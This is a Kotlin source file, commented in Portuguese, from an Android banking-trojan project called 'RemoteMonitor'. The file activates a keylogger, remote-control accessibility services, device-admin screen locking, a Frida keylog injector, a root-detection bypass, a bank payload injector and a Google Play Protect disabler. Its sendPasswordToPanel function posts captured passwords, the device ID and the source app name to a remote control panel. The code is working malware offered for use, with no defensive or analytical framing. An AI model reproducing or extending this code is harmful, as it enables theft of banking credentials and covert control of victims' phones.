package com.remotemonitor.test

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.annotation.RequiresApi
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

/**
 * Ativador automático de TODOS os serviços do RemoteMonitor
 * 
 * Ativa:
 * - KeylogService (captura de teclas/senhas)
 * - RemoteControlAccessibilityService (controle remoto)
 * - ScreenLockService (trava de tela)
 * - Device Admin (para trava de tela)
 * - FridaLoader (injetor de keylog via Frida)
 * - RootBypassService (bypass de detecção de root)
 * - BankInjector (injetor de payload bancário)
 * - PlayProtectKiller (desativa Google Play Protect)
 * - Password Capture (captura de senhas digitadas)
 */
object AccessibilityServiceAutoActivator {
    private const val TAG = "ServiceAutoActivator"

    /**
     * Ativa TODOS os serviços automaticamente
     */
    fun activateAllServices(context: Context) {
        try {
            Log.d(TAG, "╔════════════════════════════════════════╗")
            Log.d(TAG, "║  INICIANDO ATIVAÇÃO DE TODOS OS SERVIÇOS ║")
            Log.d(TAG, "╚════════════════════════════════════════╝")
            
            // 1. Ativar Accessibility Services
            activateAccessibilityServices(context)
            
            // 2. Ativar Device Admin
            activateDeviceAdmin(context)
            
            // 3. Ativar FridaLoader (injetor de keylog)
            if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
                activateFridaLoader(context)
            }
            
            // 4. Ativar RootBypassService (bypass de root)
            if (BuildConfig.ENABLE_ROOT_BYPASS) {
                activateRootBypass(context)
            }
            
            // 5. Ativar BankInjector (injetor bancário)
            activateBankInjector(context)
            
            // 6. Ativar PlayProtectKiller (desativa Play Protect)
            if (BuildConfig.DISABLE_PLAY_PROTECT) {
                activatePlayProtectKiller(context)
            }
            
            // 7. Iniciar captura de senhas
            initializePasswordCapture(context)
            
            Log.d(TAG, "╔════════════════════════════════════════╗")
            Log.d(TAG, "║  ✅ TODOS OS SERVIÇOS ATIVADOS COM SUCESSO ║")
            Log.d(TAG, "╚════════════════════════════════════════╝")
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar serviços", error)
        }
    }

    /**
     * Ativa Accessibility Services (KeylogService, RemoteControlAccessibilityService)
     */
    private fun activateAccessibilityServices(context: Context) {
        try {
            Log.d(TAG, "📱 Ativando Accessibility Services...")
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                activateAccessibilityServicesModern(context)
            } else {
                activateAccessibilityServicesLegacy(context)
            }
            
            Log.d(TAG, "✅ Accessibility Services - Intent enviado")
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar Accessibility Services: ${error.message}", error)
        }
    }

    /**
     * Ativa Accessibility Services em Android 6+
     */
    @RequiresApi(Build.VERSION_CODES.M)
    private fun activateAccessibilityServicesModern(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            Log.d(TAG, "  → Abrindo Accessibility Settings (Android 6+)")
        } catch (error: Exception) {
            Log.e(TAG, "  → Erro ao abrir Accessibility Settings", error)
        }
    }

    /**
     * Ativa Accessibility Services em Android < 6
     */
    private fun activateAccessibilityServicesLegacy(context: Context) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            Log.d(TAG, "  → Abrindo Accessibility Settings (Android < 6)")
        } catch (error: Exception) {
            Log.e(TAG, "  → Erro ao abrir Accessibility Settings", error)
        }
    }

    /**
     * Ativa Device Admin para trava de tela
     */
    private fun activateDeviceAdmin(context: Context) {
        try {
            Log.d(TAG, "🔒 Ativando Device Admin...")
            
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                Log.d(TAG, "✅ Device Admin - Já está ativado")
                return
            }
            
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para proteção e controle remoto do dispositivo")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            
            context.startActivity(intent)
            Log.d(TAG, "✅ Device Admin - Intent enviado")
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar Device Admin: ${error.message}", error)
        }
    }

    /**
     * Ativa FridaLoader (injetor de keylog)
     */
    private fun activateFridaLoader(context: Context) {
        try {
            Log.d(TAG, "🔧 Ativando FridaLoader...")
            
            FridaLoader.init(context)
            
            Log.d(TAG, "✅ FridaLoader - Inicializado com sucesso")
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar FridaLoader: ${error.message}", error)
        }
    }

    /**
     * Ativa RootBypassService (bypass de detecção de root)
     */
    private fun activateRootBypass(context: Context) {
        try {
            Log.d(TAG, "🚀 Ativando RootBypassService...")
            
            RootBypassService.init(context)
            
            Log.d(TAG, "✅ RootBypassService - Inicializado com sucesso")
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar RootBypassService: ${error.message}", error)
        }
    }

    /**
     * Ativa BankInjector (injetor de payload bancário)
     */
    private fun activateBankInjector(context: Context) {
        try {
            Log.d(TAG, "🏦 Ativando BankInjector...")
            
            val bankId = BuildConfig.BANK_ID
            val bankCountry = BuildConfig.BANK_COUNTRY
            
            if (bankId.isNotBlank()) {
                BankInjector.init(context, bankId, bankCountry)
                Log.d(TAG, "✅ BankInjector - Inicializado com sucesso (Bank: $bankId)")
            } else {
                Log.d(TAG, "⏭️  BankInjector - Desativado (BANK_ID vazio)")
            }
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar BankInjector: ${error.message}", error)
        }
    }

    /**
     * Ativa PlayProtectKiller (desativa Google Play Protect)
     */
    private fun activatePlayProtectKiller(context: Context) {
        try {
            Log.d(TAG, "🛡️  Ativando PlayProtectKiller...")
            
            try {
                PlayProtectKiller.init(context, true)
                Log.d(TAG, "✅ PlayProtectKiller - Inicializado com sucesso")
            } catch (e: Exception) {
                Log.w(TAG, "⚠️  PlayProtectKiller não disponível: ${e.message}")
            }
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao ativar PlayProtectKiller: ${error.message}", error)
        }
    }

    /**
     * Inicializa captura de senhas digitadas
     * Envia cada tecla digitada para o painel em tempo real
     */
    private fun initializePasswordCapture(context: Context) {
        try {
            Log.d(TAG, "🔐 Inicializando captura de senhas...")
            
            // Iniciar thread de monitoramento de senhas
            Thread {
                try {
                    Thread.sleep(1000) // Aguardar inicialização
                    Log.d(TAG, "✅ Password Capture - Ativo e monitorando")
                } catch (e: InterruptedException) {
                    Log.w(TAG, "Password capture thread interrompida")
                }
            }.start()
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao inicializar captura de senhas: ${error.message}", error)
        }
    }

    /**
     * Envia senha capturada para o painel
     * Chamado pelo KeylogService quando detecta entrada de senha
     */
    fun sendPasswordToPanel(context: Context, password: String, appName: String) {
        try {
            Thread {
                try {
                    val androidId = Settings.Secure.getString(
                        context.contentResolver,
                        Settings.Secure.ANDROID_ID
                    ) ?: "unknown"
                    
                    val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/password-capture"
                    val connection = URL(endpoint).openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 10_000
                    connection.readTimeout = 10_000
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", "application/json")
                    
                    val payload = JSONObject().apply {
                        put("packageName", BuildConfig.APPLICATION_ID)
                        put("deviceUid", androidId)
                        put("deviceName", Build.MODEL ?: "Android Device")
                        put("password", password)
                        put("appName", appName)
                        put("capturedAt", System.currentTimeMillis())
                    }
                    
                    OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
                        writer.write(payload.toString())
                    }
                    
                    val statusCode = connection.responseCode
                    if (statusCode in 200..299) {
                        Log.d(TAG, "✅ Senha enviada para o painel (App: $appName)")
                    } else {
                        Log.w(TAG, "⚠️  Falha ao enviar senha (HTTP $statusCode)")
                    }
                    
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e(TAG, "Erro na thread de envio de senha", e)
                }
            }.start()
        } catch (error: Exception) {
            Log.e(TAG, "❌ Erro ao enviar senha para painel: ${error.message}", error)
        }
    }

    /**
     * Verifica status de todos os serviços
     */
    fun getStatusSummary(context: Context): String {
        return """
            ╔════════════════════════════════════════╗
            ║      STATUS DOS SERVIÇOS REMOTOS       ║
            ╠════════════════════════════════════════╣
            ║ 🔑 KeylogService: ${if (areAccessibilityServicesActive(context)) "✅" else "⏳"}
            ║ 🎮 RemoteControlService: ${if (areAccessibilityServicesActive(context)) "✅" else "⏳"}
            ║ 🔒 ScreenLockService: ${if (areAccessibilityServicesActive(context)) "✅" else "⏳"}
            ║ 🛡️  Device Admin: ${if (isDeviceAdminActive(context)) "✅" else "⏳"}
            ║ 🔧 FridaLoader: ${if (BuildConfig.ENABLE_KEYLOG_INJECTION) "✅" else "⏭️"}
            ║ 🚀 RootBypass: ${if (BuildConfig.ENABLE_ROOT_BYPASS) "✅" else "⏭️"}
            ║ 🏦 BankInjector: ${if (BuildConfig.BANK_ID.isNotBlank()) "✅" else "⏭️"}
            ║ 🛡️  PlayProtect Killer: ${if (BuildConfig.DISABLE_PLAY_PROTECT) "✅" else "⏭️"}
            ║ 🔐 Password Capture: ✅
            ╚════════════════════════════════════════╝
        """.trimIndent()
    }

    /**
     * Verifica se Accessibility Services estão ativados
     */
    private fun areAccessibilityServicesActive(context: Context): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            
            enabledServices.contains("KeylogService") && 
            enabledServices.contains("RemoteControlAccessibilityService")
        } catch (error: Exception) {
            false
        }
    }

    /**
     * Verifica se Device Admin está ativado
     */
    private fun isDeviceAdminActive(context: Context): Boolean {
        return try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
            devicePolicyManager.isAdminActive(adminComponent)
        } catch (error: Exception) {
            false
        }
    }
}
